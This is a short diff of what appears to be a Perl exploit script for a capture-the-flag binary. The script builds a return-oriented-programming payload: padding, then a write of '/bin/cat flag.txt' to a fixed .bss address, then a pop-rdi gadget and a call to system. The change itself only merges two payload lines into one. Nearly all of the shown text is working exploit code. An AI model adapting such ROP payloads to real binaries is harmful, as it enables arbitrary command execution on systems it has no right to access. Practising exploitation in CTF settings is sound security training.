@@ -26,6 +26,5 @@ sub write_bytes
 
 print $PADDING
 	. write_bytes(0x601060, "/bin/cat flag.txt\0")
-	. $POPRDI
-	. $BSS
+	. $POPRDI . $BSS
 	. $CALLSYS;
